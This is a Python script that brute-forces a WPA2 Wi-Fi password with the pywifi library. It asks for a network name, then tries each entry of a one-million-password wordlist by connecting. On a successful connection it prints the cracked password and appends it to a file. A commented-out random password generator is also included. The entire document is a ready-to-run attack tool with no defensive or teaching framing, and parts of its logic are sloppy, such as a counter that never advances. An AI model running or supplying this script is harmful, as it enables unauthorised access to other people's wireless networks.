import pywifi
import random
from pywifi import const,PyWiFi,Profile
import time
import argparse
import sys
import os
import os.path
import platform
import re

RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"
try:
    # wlan
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.scan() #check the card
    results = ifaces.scan_results()


    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except:
    print("[-] Error system")

type = False
'''
def gen_pass(number):
    no = int(random.randint(8,13))
    k = 'WERTYUIOPASDFGHJKLZXCVBNMwertyuiopasdfghjklzxcvbnm1234567890!@#$'
    #kk = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']
    #kk = kk.split()
    i = 1
    p = ''
    kk = k.split()
    while i <= no:
        p = p+random.choice(kk)
        i = i + 1
    #passwd = f'kidknee{number}'
    return p
    p = '''

def main(ssid, password, number):

    profile = Profile() 
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP


    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1) # if script not working change time to 1 !!!!!!
    iface.connect(tmp_profile) # trying to Connect
    time.sleep(0.35) # 1s

    if ifaces.status() == const.IFACE_CONNECTED: # checker
        time.sleep(1)
        print(BOLD, GREEN,'[*] Crack success!',RESET)
        print(BOLD, GREEN,'[*] password is ' + password, RESET)
        king = open('cracked_password.txt','a')
        king.write(password)
        king.close()
        time.sleep(1)
        exit()
    else:
        print(RED, '[{}] Crack Failed using {}'.format(number, password))
print(BLUE)
ss = str(input('[*] enter the ssid of wifi [wifi name]: '))
number = 0
#path = r'C:/Users/91936/Documents/packages_for_tect/Top_1m_Passwords.txt'
with open('Top_1m_Passwords.txt','r') as f:
	number += 1
	for line in f:
		main(ss,line,number)
   
